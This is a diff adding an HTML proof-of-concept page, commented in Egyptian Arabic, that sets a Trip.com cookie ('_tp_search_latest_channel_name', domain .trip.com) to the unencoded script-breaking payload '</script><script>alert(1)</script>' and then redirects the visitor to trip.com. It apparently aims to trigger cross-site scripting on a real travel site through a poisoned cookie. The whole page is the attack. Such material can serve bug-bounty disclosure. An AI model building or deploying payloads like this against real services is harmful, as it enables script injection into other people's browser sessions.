@@ -1,1 +1,25 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Trip.com</title>
+</head>
+<body>
+    <script>
+        // ====== القيمة اللي انت عايزها (اي حاجة) ======
+        const MY_COOKIE_VALUE = '</script><script>alert(1)</script>';
+        // ===========================================
+
+        const COOKIE_NAME = '_tp_search_latest_channel_name';
+
+        // تعيين الكوكي (بدون ترميز عشان يكتب زي ما هو)
+        document.cookie = COOKIE_NAME + '=' + MY_COOKIE_VALUE + 
+                          '; expires=' + new Date(Date.now() + 30*86400000).toUTCString() + 
+                          '; path=/; domain=.trip.com';
+
+        // التحويل لـ Trip.com
+        window.location.href = 'https://www.trip.com/';
+    </script>
+</body>
+</html>
